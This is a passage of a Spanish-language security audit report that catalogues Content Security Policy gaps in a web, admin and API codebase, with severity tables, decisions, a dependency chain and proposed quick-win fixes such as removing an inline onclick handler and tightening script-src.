1. Astro `experimental.csp` genera un `<meta>` tag con CSP ENFORCING (no Report-Only)
2. El `script-src` del meta tag usa hashes, NO `'unsafe-inline'`
3. `'strict-dynamic'` NO se aplica a inline event handlers

Este boton **ya esta roto en produccion** si `experimental.csp` esta activo. El boton "Retry" de la pagina 500 no funciona.

**Diferencia con GAP-042-22**: GAP-042-22 reporta 10+ scripts inline no documentados, pero son `<script>` tags que reciben hashes automaticos de Astro. Este gap es un `onclick` ATTRIBUTE que NO recibe hash y es DIRECTAMENTE bloqueado por CSP.

**Impacto**: El boton de retry en la pagina de error 500 no funciona cuando CSP esta activo. Los usuarios que encuentren un error no pueden recargar la pagina con el boton provisto.

**Solucion propuesta**:

1. Mover la logica a un `<script>` tag que use `addEventListener`:

```astro
<button type="button" id="retry-btn" class="...">
<script>
  document.getElementById('retry-btn')?.addEventListener('click', () => {
    window.location.reload();
  });
</script>
```

2. Astro automaticamente hasheara este script
3. **Recomendacion**: Resolver directo (fix trivial, ~5 lineas, no requiere spec)

**Decision (2026-03-17)**: ✅ HACER. Reemplazar onclick con addEventListener en script tag. Fix directo.

---

### GAP-042-43: Sentry CSP violation collection no verificada end-to-end

| Campo | Valor |
|-------|-------|
| **Severidad** | MEDIUM |
| **Prioridad** | HIGH |
| **Complejidad** | MEDIUM |
| **Auditoria** | #5 (2026-03-17) |
| **Archivos** | `apps/web/src/middleware.ts:122-125`, `apps/admin/src/lib/csp-helpers.ts:75` |

**Descripcion**: Ambas apps configuran `report-uri` con el endpoint de Sentry, pero NO hay evidencia de que:

1. Las violations CSP realmente llegan a Sentry (no hay screenshots, logs, o dashboard)
2. Sentry agrupa correctamente las violations CSP (vs errores JS normales)
3. El `report-uri` se genera correctamente con el DSN de produccion
4. El DSN de produccion esta seteado en las env vars de Vercel
5. La rate de false positives es conocida (browser extensions, third-party injections)

**Diferencia con GAP-042-07**: GAP-042-07 se enfoca en la falta de dashboard/alertas en Sentry. Este gap es mas fundamental: NO sabemos si las violations siquiera LLEGAN a Sentry. La pipeline completa (browser -> report-uri -> Sentry) no fue verificada.

**Impacto**: Los 14 dias de observacion requeridos para Phase 2 (SPEC-046) son inutiles si las violations no se estan recolectando. Se podria asumir "zero violations" cuando en realidad las violations no se envian.

**Solucion propuesta**:

1. **Verificacion inmediata**: Abrir la web en produccion con DevTools > Console, buscar CSP violations
2. **Verificacion Sentry**: Buscar en Sentry project "Security" o "CSP" issue type
3. **Test manual**: Inyectar un inline script de prueba en dev y verificar que aparece en Sentry
4. **Recomendacion**: Incluir como prerequisito de SPEC-046 (no empezar observacion sin verificar pipeline)

**Decision (2026-03-17)**: ⏸️ POSTERGAR. Depende de deploy a producción. Prerequisito de la observación de 14 días.

---

### GAP-042-44: Admin env var `VITE_SENTRY_DSN` acceso inconsistente (server vs client)

| Campo | Valor |
|-------|-------|
| **Severidad** | LOW |
| **Prioridad** | LOW |
| **Complejidad** | LOW |
| **Auditoria** | #5 (2026-03-17) |
| **Archivos** | `apps/admin/src/middleware.ts:41` |

**Descripcion**: El middleware del admin accede al Sentry DSN con un patron dual:

```typescript
const sentryDsn = import.meta.env.VITE_SENTRY_DSN || process.env.VITE_SENTRY_DSN || '';
```

Este patron funciona pero es inconsistente con las convenciones del proyecto:

1. `import.meta.env.VITE_*` es para acceso client-side en Vite
2. `process.env.VITE_*` es para acceso server-side directo
3. El middleware corre server-side, por lo que `process.env` deberia ser suficiente
4. La convencion del proyecto dice: variables server-side usan `HOSPEDA_*` prefix

**Impacto**: Bajo. Funciona correctamente. Solo es un problema de consistencia y legibilidad.

**Solucion propuesta**:

1. Cambiar a `process.env.VITE_SENTRY_DSN || ''`
2. O mejor: usar un env var con prefix correcto (`HOSPEDA_SENTRY_DSN` server-side)
3. **Recomendacion**: Resolver cuando se haga SPEC-045 (Vite 7 migration) ya que se tocara el middleware

**Decision (2026-03-17)**: ✅ HACER. Simplificar a `process.env.VITE_SENTRY_DSN` (server-side, no necesita import.meta.env).

---

### GAP-042-45: Admin tiene 14+ instancias de `style={{}}` dinamico que bloquearian futura remocion de `'unsafe-inline'` en style-src

| Campo | Valor |
|-------|-------|
| **Severidad** | MEDIUM |
| **Prioridad** | LOW |
| **Complejidad** | HIGH (requiere CSS-in-JS migration o CSS custom properties) |
| **Auditoria** | #6 (2026-03-17) |
| **Archivos** | `apps/admin/src/components/ui/progress.tsx:13`, `apps/admin/src/components/entity-table/VirtualizedDataTable.tsx`, `apps/admin/src/components/billing/UsageDisplay.tsx`, y 11+ mas |

**Descripcion**: El admin tiene al menos 14 instancias de estilos inline dinamicos via React `style={{}}` prop. Estos incluyen:

- `transform: translateX(-${100 - value}%)` (progress bars)
- `width: ${percentage}%` (usage indicators)
- `height: ${rowHeight}px`, `top: ${virtualRow.start}px` (tablas virtualizadas)
- `maxHeight: ${expanded ? '2000px' : '0'}` (expandable sections)

Actualmente permitidos por `style-src 'self' 'unsafe-inline'` en admin CSP. Sin embargo, si en Phase 3 o futuro se intenta remover `'unsafe-inline'` de `style-src` (como recomienda OWASP), TODAS estas instancias se rompen.

**Diferencia con GAP-042-02**: GAP-042-02 es sobre Astro emitiendo style HASHES que interfieren con Sentry Replay. Este gap es sobre React INLINE STYLES que dependen de `'unsafe-inline'` en admin.

**Impacto**: No afecta Phase 1 ni Phase 2. Es un blocker para una futura Phase 3 de hardening CSP en admin. No requiere accion inmediata pero debe documentarse como deuda tecnica.

**Solucion propuesta**:

1. Para progress bars/usage: usar CSS custom properties (`--progress-value`) seteadas via `style={{}}` y consumidas en CSS (`transform: translateX(calc(-100% + var(--progress-value)))`)
2. Para tablas virtualizadas: estas librarias (TanStack Table) REQUIEREN inline styles por diseno.. aceptar `'unsafe-inline'` o evaluar `Trusted Types` (Phase 3)
3. **Recomendacion**: Documentar como deuda tecnica, no requiere spec. Resolver cuando se intente remover `'unsafe-inline'` de style-src

**Decision (2026-03-17)**: ⏸️ POSTERGAR. Deuda técnica para Phase 3. No afecta Phase 1/2. TanStack Table requiere inline styles por diseño.

---

### GAP-042-46: No hay verificacion automatizada de que todas las paginas Astro cumplen CSP post-build

| Campo | Valor |
|-------|-------|
| **Severidad** | MEDIUM |
| **Prioridad** | MEDIUM |
| **Complejidad** | MEDIUM |
| **Auditoria** | #6 (2026-03-17) |
| **Archivos** | Todas las paginas en `apps/web/src/pages/` |

**Descripcion**: La auditoria #6 verifico manualmente CADA pagina .astro y componente buscando inline event handlers, scripts sin hash, y patrones CSP-incompatibles. Esta verificacion es MANUAL y NO se repite automaticamente. Un futuro desarrollador puede agregar un `onclick`, `onload`, o `<script is:inline>` sin saber que viola CSP, y ningun test lo detectaria hasta que un usuario lo reporte.

**Hallazgos de la verificacion manual #6**:

- `500.astro`: `onclick` handler (ya documentado en GAP-042-42)
- `forgot-password.astro`: Script sin `is:inline` (Astro lo bundlea como ES module.. CSP-safe)
- `mi-cuenta/index.astro`: Script sin `is:inline` (Astro lo bundlea como ES module.. CSP-safe)
- `BaseLayout.astro`, `Header.astro`, `Footer.astro`, `ThemeToggle.astro`, `SortDropdown.astro`, `NavigationProgress.astro`, `AccordionFAQ.astro`, `DestinationCarousel.astro`: Scripts inline hasheados por Astro.. CSP-safe
- **Todos los componentes React** (`*.client.tsx`): Usan React event handlers (no inline HTML handlers).. CSP-safe
- **View Transitions**: `transition:name` genera `<style>` tags con CSS puro (no scripts).. auto-hasheados por Astro
- **JSON-LD**: Todos escapados con `.replace(/</g, '\\u003c')`.. XSS-safe
- **set:html**: Todos los 8 usos pasan por `sanitizeHtml()` o escape.. XSS-safe

**Diferencia con GAP-042-06**: GAP-042-06 se enfoca en falta de tests E2E que verifiquen CSP headers en responses. Este gap es sobre falta de un LINTER o test que detecte PATRONES CSP-incompatibles en el source code (inline handlers, eval, etc.) ANTES de que lleguen a produccion.

**Impacto**: El proximo `onclick` o `eval()` que alguien agregue pasara desapercibido hasta produccion. La auditoria manual no escala.

**Solucion propuesta**:

1. Agregar un test de CI que haga grep por patrones CSP-peligrosos: `onclick=`, `onload=`, `onerror=`, `onsubmit=`, `eval(`, `new Function(`, `document.write(` en archivos `.astro` y `.tsx` de `apps/web/`
2. Alternativamente, configurar una regla custom de Biome o ESLint que bloquee inline event handlers en archivos Astro
3. **Recomendacion**: Resolver directo como parte de los quick wins de SPEC-046 (script de CI ~15 lineas)

**Decision (2026-03-17)**: ✅ HACER. Agregar CI check (grep/script) para patrones CSP-incompatibles (onclick, eval, etc.). ~15 líneas.

---

### GAP-042-47: SPEC-045, SPEC-046, SPEC-047 NO EXISTEN como archivos de spec

| Campo | Valor |
|-------|-------|
| **Severidad** | HIGH |
| **Prioridad** | HIGH |
| **Complejidad** | MEDIUM |
| **Auditoria** | #7 (2026-03-17) |
| **Archivos** | `.claude/specs/` (ausencia de SPEC-045, SPEC-046, SPEC-047) |

**Descripcion**: El gap report de SPEC-042 referencia extensamente tres specs futuras como dependencias criticas para Phase 2:

- **SPEC-045** (Vite 7 migration): Referenciada en GAP-042-01, 18, 19, 21, 44 como prerequisito para nonce propagation en admin
- **SPEC-046** (CSP post-deploy verification): Referenciada en GAP-042-02, 03, 04, 06, 07, 12, 15, 24, 42, 43, 46 como prerrequisito para Phase 2 transition
- **SPEC-047** (unsafe-inline removal): Referenciada en GAP-042-05, 14, 42 como prerrequisito para eliminar unsafe-inline

Sin embargo, la busqueda exhaustiva en `.claude/specs/` confirma que **NINGUNA de estas tres specs existe como archivo**. Solo SPEC-045 tiene un directorio vacio mencionado en git status, y SPEC-046/047 tienen directorios con archivos pero sin spec formal generada via el sistema de specs del proyecto.

**Impacto**: La cadena de dependencias para Phase 2 (SPEC-042 -> SPEC-045/047 -> SPEC-046 -> Phase 2) esta ROTA en el primer eslabon. Sin specs formales, no hay tasks generados, no hay tracking de progreso, y las decisiones arquitecturales documentadas en el gap report (como la cadena de ejecucion) no tienen donde materializarse.

**Solucion aplicada**:

1. SPEC-046 y SPEC-047 FUSIONADAS en SPEC-042 como Phase 1.1, 1.2, y 1.3
2. SPEC-045 (Vite 7 + TanStack upgrade) se mantiene como spec separada (riesgo MEDIUM, scope diferente)
3. La observacion de 14 dias de SPEC-046 se convierte en un QA checklist separado (`.claude/specs/SPEC-042-csp-nonce-integration/qa-observation-checklist.md`)
4. **Status**: RESUELTO (consolidacion completada 2026-03-17)

**Decision (2026-03-17)**: ❌ DESCARTAR. Ya resuelto: SPEC-046/047 fusionadas en SPEC-042 Phase 1.1/1.2/1.3. SPEC-045 tiene directorio creado.

---

### GAP-042-48: `script-src https:` wildcard permite scripts de CUALQUIER dominio HTTPS en browsers CSP1

| Campo | Valor |
|-------|-------|
| **Severidad** | MEDIUM |
| **Prioridad** | MEDIUM |
| **Complejidad** | LOW |
| **Auditoria** | #7 (2026-03-17) |
| **Archivos** | `apps/web/src/middleware.ts:111` |

**Descripcion**: El CSP del web incluye `script-src 'self' 'strict-dynamic' 'unsafe-inline' https:`. El valor `https:` es un wildcard que permite cargar scripts de CUALQUIER dominio HTTPS. En browsers CSP Level 3, `'strict-dynamic'` hace que `https:` sea ignorado (solo confian en scripts hasheados/con-nonce y sus dependencias). Sin embargo, en browsers CSP Level 1 (IE, old browsers), `'strict-dynamic'` no existe, y `https:` se aplica directamente, permitiendo scripts desde `https://cdn.attacker.com` o cualquier otro dominio HTTPS.

**Cadena de fallback actual**:

- CSP3 browsers: `'strict-dynamic'` → ignora `https:` y `'unsafe-inline'` → seguro
- CSP2 browsers: hashes → ignora `'unsafe-inline'` → seguro (pero `https:` aplica)
- CSP1 browsers: `'unsafe-inline' https:` → permite CUALQUIER script HTTPS → inseguro

**Diferencia con GAP-042-05**: GAP-042-05 documenta que `'unsafe-inline'` anula hash-based integrity en CSP2. Este gap es sobre `https:` wildcard que amplifica el problema en CSP1/2 browsers permitiendo scripts de dominios arbitrarios.

**Impacto**: Medio. Afecta solo browsers CSP1 (IE, muy old browsers). En el contexto de una app de turismo en Argentina, el impacto real es bajo pero la directiva es innecesariamente permisiva.

**Solucion propuesta**:

1. Remover `https:` del `script-src` en middleware.ts
2. Si se necesita compatibilidad CSP1, usar `'unsafe-inline'` como unico fallback (ya esta presente)
3. `https:` no agrega valor: si `'unsafe-inline'` ya permite inline scripts, y `'strict-dynamic'` ignora ambos
4. **Recomendacion**: Resolver directo (remover 1 token del header, zero riesgo)

**Decision (2026-03-17)**: ✅ HACER. Remover `https:` de script-src en web middleware. Zero riesgo, 1 token.

---

### GAP-042-49: Sin validacion de coherencia entre meta tag CSP (Astro) y HTTP header CSP (middleware)

| Campo | Valor |
|-------|-------|
| **Severidad** | MEDIUM |
| **Prioridad** | MEDIUM |
| **Complejidad** | MEDIUM |
| **Auditoria** | #7 (2026-03-17) |
| **Archivos** | `apps/web/astro.config.mjs:137-160`, `apps/web/src/middleware.ts:109-125` |

**Descripcion**: La web app usa dual-policy CSP: (1) Astro `experimental.csp` genera un `<meta>` tag con hashes + directivas, y (2) el middleware genera un HTTP header con directivas complementarias. Per CSP spec, un recurso debe satisfacer AMBAS politicas simultaneamente (la interseccion es lo que aplica). Actualmente NO hay mecanismo para validar que ambas politicas son coherentes entre si.

**Divergencias actuales confirmadas**:

- `script-src`: meta tag usa hashes + strict-dynamic (sin unsafe-inline), HTTP header usa strict-dynamic + unsafe-inline + https:
- `style-src`: meta tag no lo define (cae a default-src 'self'), HTTP header define 'self' + fonts.googleapis.com + unsafe-inline
- `report-uri`: solo en HTTP header (meta tags no soportan report-uri)
- `frame-ancestors`: solo en HTTP header (meta tags no soportan frame-ancestors)

**Problema especifico**: Si el meta tag tiene `default-src 'self'` y NO define `style-src`, entonces inline styles de Sentry Replay (rrweb) son bloqueados por el meta tag AUNQUE el HTTP header los permita via `'unsafe-inline'`. El browser aplica AMBAS y el recurso debe cumplir las dos.

**Diferencia con GAP-042-03**: GAP-042-03 documenta el conflicto enforcement vs report-only entre meta y header. Este gap es sobre la COHERENCIA de directivas especificas entre ambas fuentes, no solo el modo de aplicacion.

**Impacto**: Cambios en `astro.config.mjs` (CSP experimental) o `middleware.ts` (HTTP header) pueden crear conflictos silenciosos que bloquean recursos sin warning. No hay test, linter, ni validacion que detecte incoherencias.

**Solucion propuesta**:

1. Agregar un test de integracion que compare las directivas del meta tag (build output) con las del HTTP header (middleware) y verifique coherencia
2. Documentar la tabla de directivas "meta vs header" en el codigo con notas de interaccion
3. Considerar unificar ambas fuentes en una sola configuracion compartida
4. **Recomendacion**: Incluir en SPEC-046 como prerequisito para la observacion de 14 dias

**Decision (2026-03-17)**: ❌ DESCARTAR. Se resuelve automáticamente con GAP-042-03 (deshabilitar experimental.csp). Sin meta tag, CSP es 100% HTTP header, no hay dual-policy.

---

### GAP-042-50: T-016 (inline keyframe migration) marcada completa pero NO implementada

| Campo | Valor |
|-------|-------|
| **Severidad** | MEDIUM |
| **Prioridad** | HIGH |
| **Complejidad** | LOW (1/10) |
| **Auditoria** | #8 (2026-03-17) |
| **Archivos** | `apps/admin/src/router.tsx:30-31` |

**Descripcion**: La tarea T-016 de Phase 1 requiere migrar la animacion `@keyframes router-pending-bar` de un inline style a CSS externo. La tarea se marca como "completada" en los findings de SPEC-042, pero la verificacion linea-por-linea revela que el inline style SIGUE en `router.tsx`:

```typescript
style={{
    animation: 'router-pending-bar 1.5s ease-in-out infinite'
}}
```

La animacion `@keyframes` SI fue movida a `styles.css` (lineas 142-155), pero el componente sigue usando `style={{}}` prop para aplicarla en vez de una clase CSS. Esto viola CSP `style-src` si se remueve `'unsafe-inline'`.

**Impacto**: El pending bar del router no funcionaria en un futuro Phase 3 donde se intente remover `'unsafe-inline'` de `style-src`. En Phase 1/2 no bloquea porque `style-src 'unsafe-inline'` esta presente.

**Solucion propuesta**:

1. Crear clase CSS `.router-pending-bar { animation: router-pending-bar 1.5s ease-in-out infinite; }` en `styles.css`
2. Cambiar `style={{...}}` a `className="router-pending-bar"` en `router.tsx`
3. **Recomendacion**: Resolver directo (fix trivial, 2 lineas)

**Decision (2026-03-17)**: ✅ HACER. Migrar inline style a className en router.tsx. Crear clase CSS en styles.css. 2 líneas.

---

### GAP-042-51: Admin vercel.json sin CSP header fallback para SSR initial load

| Campo | Valor |
|-------|-------|
| **Severidad** | HIGH |
| **Prioridad** | HIGH |
| **Complejidad** | LOW (2/10) |
| **Auditoria** | #8 (2026-03-17) |
| **Archivos** | `apps/admin/vercel.json` |

**Descripcion**: El admin middleware CSP solo cubre server function responses (GAP-042-13). El SSR HTML inicial NO recibe CSP header. Como workaround inmediato, se podria agregar un CSP basico estatico en `vercel.json` que cubra el SSR initial load hasta que SPEC-045 habilite HTTP-level middleware.

**Diferencia con GAP-042-13**: GAP-042-13 documenta que el middleware no cubre SSR. Este gap propone un WORKAROUND especifico: usar vercel.json como CSP fallback estatico mientras la limitacion de framework persista.

**Impacto**: Sin este workaround, el SSR initial del admin (login page, deep links, primera carga) tiene ZERO proteccion CSP. Cualquier XSS en el HTML inicial no tiene defensa.

**Solucion propuesta**:

1. Agregar `Content-Security-Policy-Report-Only` header estatico en `apps/admin/vercel.json`
2. Usar una version BASICA sin nonce (ya que nonce requiere generacion dinamica):

   ```json
   {
       "key": "Content-Security-Policy-Report-Only",
       "value": "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://*.ingest.sentry.io https://*.vercel.app https://*.mercadopago.com; frame-src https://*.mercadopago.com; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'"
   }
   ```

3. Este CSP estatico es mas debil que el dinamico (sin nonce) pero es mejor que NADA
4. Cuando SPEC-045 habilite HTTP middleware, remover el header estatico de vercel.json
5. **Recomendacion**: Resolver directo (agregar header a vercel.json, ~5 lineas JSON)

**Decision (2026-03-17)**: ✅ HACER. Agregar CSP Report-Only estático en admin vercel.json como workaround para SSR sin middleware. ~5 líneas JSON.

---

### GAP-042-52: Tasks T-021 a T-038 no formalizadas en sistema de tracking

| Campo | Valor |
|-------|-------|
| **Severidad** | LOW |
| **Prioridad** | MEDIUM |
| **Complejidad** | LOW (1/10) |
| **Auditoria** | #8 (2026-03-17) |
| **Archivos** | `.claude/tasks/` (ausencia de task state para T-021 a T-038) |

**Descripcion**: Las nuevas fases 1.1, 1.2 y 1.3 fueron documentadas en `spec.md` con 18 tasks (T-021 a T-038), pero NO fueron formalizadas en el sistema de tracking del proyecto (`.claude/tasks/SPEC-042-csp-nonce-integration/`). Esto significa que `/tasks` y `/next-task` no las muestran, y el progreso no se trackea automaticamente.

**Impacto**: Bajo en terminos de seguridad, pero alto en terminos de proceso. Sin tasks formalizadas, es facil olvidar ejecutarlas o perder tracking de cuales estan completadas.

**Solucion propuesta**:

1. Ejecutar `/task-master:task-from-spec` para generar tasks formales de las nuevas fases
2. O crear manualmente el state.json con las 18 tasks
3. **Recomendacion**: Ejecutar task-from-spec antes de empezar a implementar Phase 1.1

**Decision (2026-03-17)**: ✅ HACER. Formalizar tasks via task-from-spec antes de implementar.

---

## Reclasificaciones de Severidad (Auditoria #5)

| Gap | Severidad anterior | Severidad nueva | Justificacion |
|-----|-------------------|-----------------|---------------|
| GAP-042-22 | MEDIUM | **HIGH** | La auditoria #5 confirmo 10+ scripts inline y descubrio que uno de ellos (500.astro onclick) es una VIOLACION DIRECTA de CSP. El inventario incompleto de inline scripts en la spec crea riesgo de romper funcionalidad en Phase 2 |
| GAP-042-06 | MEDIUM (prioridad HIGH) | **HIGH** (severidad elevada) | Sin tests E2E, el onclick en 500.astro paso desapercibido por 4 auditorias. Solo la auditoria #5 con busqueda exhaustiva de `onclick\|onload\|onerror` lo detecto. Esto prueba que tests de integracion son criticos para detectar violations |

## Reclasificaciones de Severidad (Auditoria #4)

| Gap | Severidad anterior | Severidad nueva | Justificacion |
|-----|-------------------|-----------------|---------------|
| GAP-042-04 | MEDIUM | **HIGH** | `'unsafe-eval'` es un downgrade significativo de CSP. Permite construir codigo arbitrario desde strings, bypasseando protecciones. Verificacion del antifraud script debe ser INMEDIATA, no diferida |
| GAP-042-27 | MEDIUM | **HIGH** | `img-src https:` permite exfiltracion de datos sin necesidad de script injection. Solo HTML injection basta para exfiltrar via image URLs. Vector de ataque real y documentado |
| GAP-042-30 | MEDIUM | **HIGH** | Bypass de TODOS los security headers (no solo CSP) en rutas de docs. Si docs son publicamente accesibles, permite clickjacking, MIME sniffing, y falta de HSTS en esas paginas |
| GAP-042-37 | INFO | **MEDIUM** | `X-XSS-Protection: 1; mode=block` puede INTRODUCIR vulnerabilidades XSS en IE/old Edge via selective script blocking. No es solo inconsistencia estetica, es un riesgo real para browsers legacy |

---

## Matriz de Prioridad

### CRITICAL (bloquean Phase 2, rompen Phase 1, o son vulnerabilidades activas)

| Gap | Severidad | Accion | Auditoria |
|-----|-----------|--------|-----------|
| **GAP-042-39** | **CRITICAL** | **API route factory aplica CSP permisivo (unsafe-inline + CDNs) a TODAS las rutas.. fix inmediato** | **#4** |
| GAP-042-03 | **CRITICAL** | Astro meta ENFORCES (no Report-Only).. decidir si deshabilitar experimental.csp | #1, elevado #3 |
| GAP-042-01 | **CRITICAL** | SPEC-045 (Vite 7 migration) | #1, elevado #3 |
| GAP-042-13 | **CRITICAL** | SSR admin sin CSP.. workaround vercel.json + SPEC-045 | #1, elevado #3 |
| GAP-042-12 | HIGH | Activar SPEC-046 | #1 |
| GAP-042-15 | HIGH | Activar SPEC-025 | #1 |
| GAP-042-18 | HIGH | Prerequisito en SPEC-045 (getCspNonce no implementado) | #2 |
| GAP-042-19 | HIGH | Upgrade TanStack como tarea de SPEC-045 | #2 |
| **GAP-042-42** | **HIGH** | **Reemplazar `onclick` en 500.astro con `addEventListener`.. YA ROTO en produccion** | **#5** |
| GAP-042-26 | HIGH | Agregar `upgrade-insecure-requests` a las 3 apps (fix trivial) | #3 |
| **GAP-042-47** | **HIGH** | **RESUELTO**: SPEC-046/047 fusionadas en SPEC-042 Phase 1.1/1.2/1.3. Solo SPEC-045 se mantiene separada | **#7** |

### Importantes (afectan calidad/seguridad)

| Gap | Severidad | Accion | Auditoria |
|-----|-----------|--------|-----------|
| GAP-042-02 | HIGH | Monitorear en SPEC-046 | #1 |
| GAP-042-04 | **HIGH** (elevado de MEDIUM, #4) | Verificar MercadoPago antifraud.. si no carga, remover `'unsafe-eval'` INMEDIATAMENTE | #1, elevado #4 |
| GAP-042-27 | **HIGH** (elevado de MEDIUM, #4) | `img-src https:` permite exfiltracion via image URLs sin script injection | #3, elevado #4 |
| GAP-042-30 | **HIGH** (elevado de MEDIUM, #4) | API docs bypass TODOS los headers.. solo debe bypass CSP | #3, elevado #4 |
| **GAP-042-43** | MEDIUM (prioridad HIGH) | Verificar pipeline report-uri -> Sentry E2E antes de observacion | **#5** |
| GAP-042-05 | MEDIUM | SPEC nueva (eliminar is:inline) | #1 |
| GAP-042-06 | **HIGH** (elevado de MEDIUM, #5) | Tests E2E detectarian onclick y otras violations | #1, elevado #5 |
| GAP-042-07 | MEDIUM | Incluir en SPEC-046 | #1 |
| GAP-042-16 | MEDIUM | Fix directo | #1 |
| GAP-042-17 | MEDIUM | Fix directo | #1 |
| GAP-042-21 | MEDIUM | Se resuelve con SPEC-045 | #2 |
| GAP-042-22 | **HIGH** (elevado de MEDIUM, #5) | 10+ inline scripts + onclick handler no documentados | #2, elevado #5 |
| GAP-042-23 | MEDIUM | Fix directo (agregar 3-4 tests) | #2 |
| GAP-042-24 | MEDIUM | Incluir en SPEC-046 o CI config | #2 |
| GAP-042-31 | MEDIUM | Agregar dominio API explicito a connect-src | #3 |
| GAP-042-38 | MEDIUM | Reemplazar *.vercel.app con dominio especifico | #3 |
| **GAP-042-40** | MEDIUM | Restringir `*.mercadopago.com` a subdominios especificos | **#4** |
| **GAP-042-41** | MEDIUM | Agregar tests de seguridad del nonce (unicidad, entropia, formato) | **#4** |
| GAP-042-37 | **MEDIUM** (elevado de INFO, #4) | `X-XSS-Protection: 1; mode=block` introduce vulnerabilidades en IE/old Edge | #3, elevado #4 |
| **GAP-042-48** | MEDIUM | `https:` wildcard en script-src permite scripts de cualquier HTTPS en CSP1 browsers | **#7** |
| **GAP-042-49** | MEDIUM | Sin validacion de coherencia entre meta tag CSP y HTTP header CSP | **#7** |
| **GAP-042-50** | MEDIUM (prio HIGH) | T-016 no completada: inline style en router.tsx:30 | **#8** |
| **GAP-042-51** | HIGH | Admin vercel.json sin CSP fallback para SSR initial | **#8** |

### Mejoras (no bloquean pero mejoran postura)

| Gap | Severidad | Accion | Auditoria |
|-----|-----------|--------|-----------|
| GAP-042-14 | MEDIUM | SPEC nueva pre-Phase 2 | #1 |
| GAP-042-28 | MEDIUM | Trusted Types (Phase 3 enhancement) | #3 |
| GAP-042-32 | MEDIUM | Unificar Permissions-Policy | #3 |
| GAP-042-09 | LOW | Fix directo | #1 |
| GAP-042-10 | LOW | Futuro Phase 2 spec | #1 |
| GAP-042-11 | LOW | Resolver directo | #1 |
| GAP-042-08 | LOW | Diferido (no urgente) | #1 |
| GAP-042-20 | LOW | Documentar diferencia, no accion | #2 |
| GAP-042-25 | LOW | Refactoring futuro, no requiere spec | #2 |
| GAP-042-29 | LOW | Monitorear, no accion inmediata | #3 |
| GAP-042-33 | LOW | Agregar frame-src 'none' al web (1 linea) | #3 |
| GAP-042-34 | LOW | Aceptar riesgo (DSN semi-publico) | #3 |
| GAP-042-35 | LOW | Agregar media-src explicito (1 linea) | #3 |
| GAP-042-36 | LOW | API font-src deberia ser 'none' (1 linea) | #3 |
| **GAP-042-44** | LOW | Admin env var VITE_SENTRY_DSN acceso inconsistente | **#5** |
| **GAP-042-45** | MEDIUM (prio LOW) | Admin 14+ inline styles dinamicos bloquearian futura remocion de unsafe-inline en style-src | **#6** |
| **GAP-042-46** | MEDIUM | Sin CI linter para detectar patrones CSP-incompatibles en source code | **#6** |
| **GAP-042-52** | LOW (prio MEDIUM) | Tasks T-021 a T-038 no formalizadas en sistema de tracking | **#8** |

---

## Cadena de Dependencias para Phase 2

### Orden de Ejecucion Definitivo

| Fase | Spec | Alcance | Depende de | Paralela con |
|------|------|---------|------------|--------------|
| **A** | **SPEC-042** | CSP Phase 1 Report-Only (web + admin) | Ninguna | — |
| **B1** | **SPEC-047** | Eliminar `'unsafe-inline'` de web `script-src` | SPEC-042 | SPEC-045 |
| **B2** | **SPEC-045** | Vite 7 + TanStack upgrade + nonce wiring (admin) | SPEC-042 | SPEC-047 |
| **C** | **SPEC-046 §1B** | 8 quick-win fixes (1 linea cada uno) | SPEC-045 | — |
| **D** | **SPEC-046** | 14 dias de observacion en staging | B1 + B2 + C | — |
| **E** | Phase 2 switch | Cambiar Report-Only a enforcement | SPEC-046 OK | — |

### Diagrama (actualizado post-consolidacion)

```
SPEC-042 (Phase 1, DONE)
    ├──> Phase 1.1 (quick wins, ~16 lineas) ──────────────────┐
    ├──> Phase 1.2 (remove unsafe-inline web, ~70 lineas) ────┤
    └──> Phase 1.3 (structural improvements) ──────────────────┤
                                                                v
                                                    SPEC-045 (Vite 7 + TanStack)
                                                                │
                                                                v
                                                    QA Observation (14 dias)
                                                                │
                                                                v
                                                    Phase 2 (enforcement switch)
```

### Camino Critico

**SPEC-045 sigue siendo el camino critico para Phase 2.** Las nuevas fases 1.1, 1.2 y 1.3 pueden ejecutarse AHORA sin esperar SPEC-045. La observacion de 14 dias (QA checklist) SI requiere que SPEC-045 complete para que el admin tenga CSP completo.

### Decision Requerida Antes de QA Observation

**GAP-042-03**: Astro `experimental.csp` emite CSP enforcing (no Report-Only). Opciones:

1. Deshabilitar `experimental.csp` para Phase 1 pura Report-Only
2. Interceptar header en middleware y renombrar a Report-Only
3. Aceptar enforcement parcial

Esta decision debe tomarse ANTES de empezar la observacion del QA Observation checklist.

### Quick Wins - Aplicar Inmediatamente

**Prioridad CRITICA (fix de seguridad)**:

| # | Fix | Apps | Gap | Complejidad |
|---|-----|------|-----|-------------|
| **0** | **Mover CSP permisivo del route factory SOLO a docs routes** | **API** | **GAP-042-39** | **~20 lineas** |
| **0b** | **Reemplazar `onclick` en 500.astro con `addEventListener`** | **Web** | **GAP-042-42** | **~5 lineas** |

**Quick Wins (SPEC-046 §1B)** - Aplicar antes de observacion:

| # | Fix | Apps | Gap | Complejidad |
|---|-----|------|-----|-------------|
| 1 | Agregar `upgrade-insecure-requests` | Web, Admin, API | GAP-042-26 | 1 linea x 3 |
| 2 | Agregar `frame-src 'none'` | Web | GAP-042-33 | 1 linea |
| 3 | Agregar `media-src 'self'` | Web, Admin | GAP-042-35 | 1 linea x 2 |
| 4 | Cambiar API `font-src` a `'none'` | API | GAP-042-36 | 1 linea |
| 5 | Fix `X-XSS-Protection: '0'` | API | GAP-042-37 | 1 linea |
| 6 | Unificar `Permissions-Policy` completo | Web, Admin | GAP-042-32 | vercel.json |
| 7 | Fix API docs bypass solo CSP (no todos los headers) | API | GAP-042-30 | ~5 lineas |
| 8 | Reemplazar `*.vercel.app` con dominio especifico | Web, Admin | GAP-042-38 | 1 linea x 2 |
| 9 | Agregar tests de seguridad del nonce | Admin | GAP-042-41 | ~30 lineas |
| 10 | Agregar CI check para patrones CSP-incompatibles (onclick, eval, etc.) | Web | GAP-042-46 | ~15 lineas |
| 13 | Remover `https:` de `script-src` en web middleware | Web | GAP-042-48 | 1 token |
| 14 | Migrar inline `style={{animation}}` a className en router.tsx | Admin | GAP-042-50 | 2 lineas |
| 15 | Agregar CSP Report-Only estatico en admin vercel.json | Admin | GAP-042-51 | ~5 lineas JSON |

---

## Resumen de Auditorias

| Auditoria | Fecha | Gaps nuevos | Reclasificaciones | Gaps totales | Foco |
|-----------|-------|-------------|-------------------|--------------|------|
